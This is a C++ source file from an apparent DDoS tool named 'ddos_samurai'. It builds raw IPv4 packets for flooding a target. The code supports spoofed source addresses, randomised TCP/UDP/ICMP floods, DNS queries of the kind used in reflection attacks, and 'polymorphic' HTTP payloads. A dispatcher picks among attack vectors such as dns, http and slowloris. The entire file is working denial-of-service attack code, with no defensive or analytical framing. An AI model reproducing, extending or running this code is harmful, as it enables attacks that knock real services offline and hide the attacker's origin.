#include "engine.hpp"
#include "detail.hpp"

namespace ddos_samurai::cpu_native {
using namespace detail;
std::vector<uint8_t> build_transport_packet(const PacketConfig& cfg) {
  const OSProfile& profile = select_profile();
  const std::string src_ip =
      cfg.spoof ? get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file)
                : resolve_local_source_ip(cfg.target_ip);
  const uint32_t src_ip_int = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst_ip_int = static_cast<uint32_t>(ip_to_int(cfg.target_ip));
  const int ttl = cfg.ttl.value_or(profile.ttl);
  const int tos = cfg.tos.value_or(0);
  const int src_port = rand_int(1024, 65535);
  const std::string proto = to_lower(cfg.protocol);
  bool is_syn_only = false;
  std::vector<uint8_t> l4_data;

  if (proto == "tcp") {
    const int flags_int = parse_tcp_flags(cfg.tcp_flags);
    is_syn_only = (flags_int & TCP_SYN) && !(flags_int & (TCP_ACK | TCP_PSH));
    const std::vector<uint8_t> payload =
        cfg.has_payload ? cfg.payload : (is_syn_only ? std::vector<uint8_t>{}
                                                     : random_bytes(static_cast<size_t>(rand_int(16, 128))));
    const auto options = profile_tcp_options(profile);
    const auto tcp_hdr = build_tcp_header(src_port,
                                          cfg.target_port,
                                          rand_u32(0, 0xFFFFFFFFu),
                                          (flags_int & TCP_ACK) ? rand_u32(0, 0xFFFFFFFFu) : 0u,
                                          flags_int,
                                          cfg.window.value_or(profile.window),
                                          0,
                                          options,
                                          src_ip_int,
                                          dst_ip_int,
                                          payload);
    l4_data = tcp_hdr;
    l4_data.insert(l4_data.end(), payload.begin(), payload.end());
  } else if (proto == "udp") {
    const auto payload = cfg.has_payload ? cfg.payload : std::vector<uint8_t>{};
    const auto udp_hdr = build_udp_header(src_port, cfg.target_port, payload, src_ip_int, dst_ip_int, true);
    l4_data = udp_hdr;
    l4_data.insert(l4_data.end(), payload.begin(), payload.end());
  } else if (proto == "icmp") {
    const auto payload = cfg.has_payload ? cfg.payload : random_bytes(32);
    l4_data = build_icmp_echo(0, 0, payload);
  } else {
    throw std::invalid_argument("Unsupported protocol: " + cfg.protocol);
  }

  auto packet = build_ipv4_header(src_ip,
                                  cfg.target_ip,
                                  proto == "tcp" ? PROTO_TCP : (proto == "udp" ? PROTO_UDP : PROTO_ICMP),
                                  static_cast<int>(l4_data.size()),
                                  ttl,
                                  tos,
                                  0,
                                  0x4000,
                                  {});
  packet.insert(packet.end(), l4_data.begin(), l4_data.end());
  return maybe_pad(std::move(packet), cfg.pad_size, is_syn_only);
}

std::vector<uint8_t> build_dns_packet(const PacketConfig& cfg) {
  const std::string src_ip =
      cfg.spoof ? get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file)
                : resolve_local_source_ip(cfg.target_ip);
  const uint32_t src_ip_int = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst_ip_int = static_cast<uint32_t>(ip_to_int(cfg.target_ip));
  const auto dns_payload = build_dns_query(cfg.dns_name, choose_dns_qtype(cfg), cfg.dns_recursive, cfg.dns_edns, 0);
  const auto udp_hdr = build_udp_header(rand_int(1024, 65535), cfg.target_port, dns_payload, src_ip_int, dst_ip_int, true);
  auto packet = build_ipv4_header(src_ip,
                                  cfg.target_ip,
                                  PROTO_UDP,
                                  static_cast<int>(udp_hdr.size() + dns_payload.size()),
                                  cfg.ttl.value_or(64),
                                  cfg.tos.value_or(0),
                                  0,
                                  0x4000,
                                  {});
  packet.insert(packet.end(), udp_hdr.begin(), udp_hdr.end());
  packet.insert(packet.end(), dns_payload.begin(), dns_payload.end());
  return maybe_pad(std::move(packet), cfg.pad_size, false);
}

std::vector<uint8_t> build_polymorphic_http_packet(const PacketConfig& cfg) {
  const OSProfile& profile = select_profile();
  const std::string src_ip =
      cfg.spoof ? get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file)
                : resolve_local_source_ip(cfg.target_ip);
  const uint32_t src_ip_int = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst_ip_int = static_cast<uint32_t>(ip_to_int(cfg.target_ip));
  const auto payload = polymorphic_http_payload(cfg.target_ip, "/", "GET");
  const auto options = profile_tcp_options(profile);
  const auto tcp_hdr = build_tcp_header(rand_int(1024, 65535),
                                        cfg.target_port,
                                        rand_u32(0, 0xFFFFFFFFu),
                                        rand_u32(0, 0xFFFFFFFFu),
                                        TCP_PSH | TCP_ACK,
                                        cfg.window.value_or(profile.window),
                                        0,
                                        options,
                                        src_ip_int,
                                        dst_ip_int,
                                        payload);
  auto packet = build_ipv4_header(src_ip,
                                  cfg.target_ip,
                                  PROTO_TCP,
                                  static_cast<int>(tcp_hdr.size() + payload.size()),
                                  cfg.ttl.value_or(profile.ttl),
                                  cfg.tos.value_or(0),
                                  0,
                                  0x4000,
                                  {});
  packet.insert(packet.end(), tcp_hdr.begin(), tcp_hdr.end());
  packet.insert(packet.end(), payload.begin(), payload.end());
  return packet;
}

std::vector<uint8_t> create_packet(const PacketConfig& cfg) {
  const std::string vector = to_lower(cfg.attack_vector);
  if (vector == "dns") return build_dns_packet(cfg);
  if (vector == "http" || vector == "slowloris" || vector == "http2") return build_polymorphic_http_packet(cfg);
  return build_transport_packet(cfg);
}

}  // namespace ddos_samurai::cpu_native
